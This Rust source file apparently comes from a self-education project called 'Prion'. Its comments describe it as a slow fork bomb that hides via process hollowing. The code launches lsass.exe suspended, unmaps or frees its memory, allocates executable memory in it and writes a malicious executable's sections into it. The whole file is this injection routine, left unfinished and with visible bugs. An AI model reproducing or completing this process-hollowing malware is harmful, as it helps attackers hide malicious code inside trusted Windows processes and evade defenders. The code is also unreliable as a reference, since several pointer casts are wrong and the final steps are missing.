//Prion is a slow-moving fork bomb which tries to hide using process hollowing
//Created for self-educational purposes - adapted from Malware Analyst's Cookbook
//DO NOT RUN OR DISTRIBUTE!
#![allow(unused_imports, unused_variables, unused_mut, safe_packed_borrows)]
#![feature(try_from)]

use std::process::{Command, Stdio};
use std::{thread, time, env};
use std::vec::Vec;
use std::fs::File;
use std::io::prelude::*;
use std::ptr::null;
use std::str::from_utf8;
use std::string::String;
use std::ffi::CString;
use std::mem;
use std::mem::size_of;
use std::convert::*;

extern crate subprocess;
use subprocess::{Popen, PopenConfig, Exec};

extern crate kernel32;
//use kernel32::GetProcAddress;

extern crate winapi;
use std::ffi::OsStr;
use std::iter::once;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use winapi::um::winuser::{MB_OK, MessageBoxW};
use winapi::um::winbase::{CREATE_SUSPENDED, DETACHED_PROCESS, CREATE_NEW_PROCESS_GROUP, LPCONTEXT};
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress};
use winapi::um::processthreadsapi::{CreateProcessW, LPPROCESS_INFORMATION, PROCESS_INFORMATION, STARTUPINFOW};
//use winapi::shared::ntdef::FALSE;
use winapi::shared::minwindef::{FALSE, DWORD, HINSTANCE__, LPVOID};
use winapi::shared::basetsd::{SIZE_T};
use winapi::shared::winerror::{HRESULT_FROM_WIN32};
use winapi::um::memoryapi::{VirtualFreeEx, VirtualAllocEx, WriteProcessMemory};
use winapi::um::errhandlingapi::{GetLastError};
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, CONTEXT};
use winapi::ctypes::c_void;


extern crate bytes;
use bytes::Bytes;

extern crate byteorder;
use byteorder::{ByteOrder, BigEndian, LittleEndian};

extern crate pelite;
use pelite::pe64::{Pe, PeFile};
use pelite::image::{IMAGE_DOS_HEADER, IMAGE_SECTION_HEADER, IMAGE_NT_HEADERS64};

struct ProcessData {
	pidh : u8,
	pinh : u8
}

/*
pData -> mal_buf
pidh -> dos_head
pinh -> nt_head
pish -> section_head
si -> startup_info
pi -> process_info

*/

fn main() {
	
	//Read the malicious executable into a buffer
	let mut mal_buf = Vec::new();
	let mut mal_file = File::open("C:\\Users\\Emily\\Documents\\mal\\mal.exe").expect("Error opening file.\n");
	mal_file.read_to_end(&mut mal_buf).expect("Error reading file contents into buffer.\n");
	
	let mal_data = ProcessData{pidh : mal_buf[0], pinh : mal_buf[1]};
	
	let mal_pe = PeFile::from_bytes(&mal_buf).unwrap();
	let dos_head = mal_pe.dos_header();
	let nt_head = mal_pe.nt_headers();
	let section_head = mal_pe.section_headers();
	
	//Needed for VirtualFreeEx later
	//let legit_pe = PeFile::from_bytes(&mal_buf).unwrap();
	//let nt_head = mal_pe.nt_headers();
	
	//println!("File:\n{:?}\n", mal_file);
	//println!("Buf contents:\n{:?}\n", mal_buf);
	
	//let mut mal_proc = Exec::shell("C:\\Users\\Emily\\Documents\\mal\\mal.exe").detached();

	//u16 representations of str needed for calling W (unicode) versions of windows commands
	let mut legit_path: Vec<u16> = OsStr::new("C:\\windows\\system32\\lsass.exe").encode_wide().chain(once(0)).collect();
	let mut mal_path: Vec<u16> = OsStr::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").encode_wide().chain(once(0)).collect();
	
	
	let mut proc_info = PROCESS_INFORMATION {
            hProcess: null_mut(),
            hThread: null_mut(),
            dwProcessId: 0,
            dwThreadId: 0,
	};
	
	/*
	let mut proc_info = PROCESS_INFORMATION {
            hProcess: legit_path as LPVOID,
            hThread: null_mut(),
            dwProcessId: 0,
            dwThreadId: 0,
	};
	*/
	
	let mut startup_info : STARTUPINFOW = unsafe { mem::zeroed() };
	startup_info.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
	
	
	let mut legit_proc = unsafe { 
						CreateProcessW (null_mut(),
										legit_path.as_mut_ptr(),
										//mal_path.as_mut_ptr(),
										null_mut(), null_mut(), FALSE,
										//Create thread in suspended state
										//0x00000004,
										//0x00000010,
										CREATE_SUSPENDED,
										null_mut(), null_mut(),
										&mut startup_info, &mut proc_info)						
							};
	
	//let mut legit_proc = Exec::shell("C:\\windows\\system32\\lsass.exe").detached();
	//legit_proc.popen();
	
	
	//Part 3
	//let mut mod_handle_str: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(once(0)).collect();
	let mut mod_handle_str: Vec<u16> = OsStr::new("C:\\Windows\\System32\\ntdll.dll").encode_wide().chain(once(0)).collect();
	
	let mut mod_handle = unsafe {
							GetModuleHandleW (mod_handle_str.as_ptr())
						};
						
	//let mal_path_i8 = CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul();
	//let mal_path_c_str = CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul();
	
	//Forced into this - *const i8 demanded by GetProcAddress
	//Might want to have a bucket nearby before reading
	let mal_path_i8 : i8 = unsafe {
							//i8::try_from(*mal_path_c_str.as_ptr()).unwrap()
							i8::try_from(*CString::new("C:\\Users\\Emily\\Documents\\mal\\mal.exe").unwrap().as_bytes_with_nul().as_ptr()).unwrap()
						};
						
	let unmap_i8 : i8 = unsafe {
							//i8::try_from(*mal_path_c_str.as_ptr()).unwrap()
							i8::try_from(*CString::new("NtUnmapViewOfSection").unwrap().as_bytes_with_nul().as_ptr()).unwrap()
						};
						
	//No W version of GetProcAddress available
	let mut proc_addr = unsafe {
							//GetProcAddress (mod_handle, mal_path_i8 as *const i8)
							GetProcAddress (mod_handle, unmap_i8 as *const i8)
							
							/*
							GetProcAddress (
							GetModuleHandleW (mod_handle_str.as_ptr()),
							mal_path_i8 as *const i8
							)
							*/
						};
	
	
	let mut mal_img_base = nt_head.OptionalHeader.ImageBase;
	
	//NtUnmapViewOfSection not available in winapi-rs
	//Resorting to VirtualFreeEx instead
	//Parameter incorrect error being thrown here
	let free_res = unsafe {
						VirtualFreeEx (
							proc_info.hProcess,
							mal_img_base as LPVOID,
							//1000,
							//Not correct, but best guess for now
							nt_head.OptionalHeader.SizeOfImage as SIZE_T,
							MEM_RELEASE
							//0x8000
							)
					};
	

	let err = unsafe {
				GetLastError()
	};
	
	//Part 4
	let alloc_res = unsafe {
						VirtualAllocEx (
							proc_info.hProcess,
							mal_img_base as LPVOID,
							nt_head.OptionalHeader.SizeOfImage as SIZE_T,
							MEM_COMMIT | MEM_RESERVE,
							PAGE_EXECUTE_READWRITE
							)
					};
					
	let err2 = unsafe {
				GetLastError()
	};
	
	//Part 5
	let write_res = unsafe {
						WriteProcessMemory (
							proc_info.hProcess,
							nt_head.OptionalHeader.ImageBase as LPVOID,
							mal_buf[0] as LPVOID,
							nt_head.OptionalHeader.SizeOfHeaders as SIZE_T,
							null_mut()
							)
					};
	
	//Err 299: only part of this request was completed
	let err3 = unsafe {
				GetLastError()
	};

	
	//Part 6
	for i in 0..nt_head.FileHeader.NumberOfSections {
		/*
		//let mut offset = dos_head.e_lfanew + size_of::<IMAGE_NT_HEADERS64>() + size_of::<IMAGE_SECTION_HEADER>() * i;
		let struct_size = size_of::<IMAGE_NT_HEADERS64>() + size_of::<IMAGE_SECTION_HEADER>();
		let e_lfanew_size = dos_head.e_lfanew as usize;
		let offset = (struct_size + e_lfanew_size) * (i as usize);
		
		//let mut index : usize = mal_buf[offset as usize] as usize;
		*/
		let mut index = i as usize;
		
		let mut write_res = unsafe {
							WriteProcessMemory (
								proc_info.hProcess,
								(mal_img_base + u64::from(section_head[index].VirtualAddress)) as LPVOID,
								mal_buf[(section_head[index].PointerToRawData) as usize] as LPVOID,
								section_head[index].SizeOfRawData as SIZE_T,
								//section_head[index].SizeOfHeaders as SIZE_T,
								null_mut()
							)
						};
		/*
		let mut write_res = unsafe {
							WriteProcessMemory (
								proc_info.hProcess,
								(mal_img_base + u64::from(section_head[0].VirtualAddress)) as LPVOID,
								mal_buf[(section_head[0].PointerToRawData) as usize] as LPVOID,
								//section_head[0].SizeOfRawData as SIZE_T,
								section_head[0].SizeOfHeaders as SIZE_T,
								null_mut()
							)
						};
		*/
		println!("write_res: {:?}\n", write_res);
	};
	
	
	//Part 7
	
	
	
	
	println!("PE e_magic:{:?}\n", mal_pe.dos_header().e_magic);
	
	println!("legit_proc:\n{:?}\n", legit_proc);
	
	//println!("mal_proc:\n{:?}\n", mal_proc);
	
	println!("mod_handle_str:\n{:?}\n", mod_handle_str);
	
	println!("mal_path_i8:\n{:?}\n", mal_path_i8);
	
	println!("unmap:\n{:?}\n", unmap_i8);
	
	println!("proc_addr:\n{:?}\n", proc_addr);
	
	println!("mod handle:\n{:?}\n", mod_handle);
	
	println!("free_res:\n{:?}\n", free_res);
	
	println!("alloc_res:\n{:?}\n", alloc_res);
	
	println!("write_res:\n{:?}\n", write_res);
	
	println!("err:\n{:?}, {:?}, {:?}\n", err, err2, err3);
	
	println!("proc_info.hProcess:\n{:?}\n", proc_info.hProcess);
	
	println!("mal_img_base as LPVOID:\n{:?}\n", mal_img_base as LPVOID);
	
	thread::sleep(time::Duration::from_millis(10000));
	
	println!("mal process created in suspended state.\n");
	println!("Process data:\npidh: {:?}\npinh: {:?}", mal_data.pidh, mal_data.pinh)
	
}

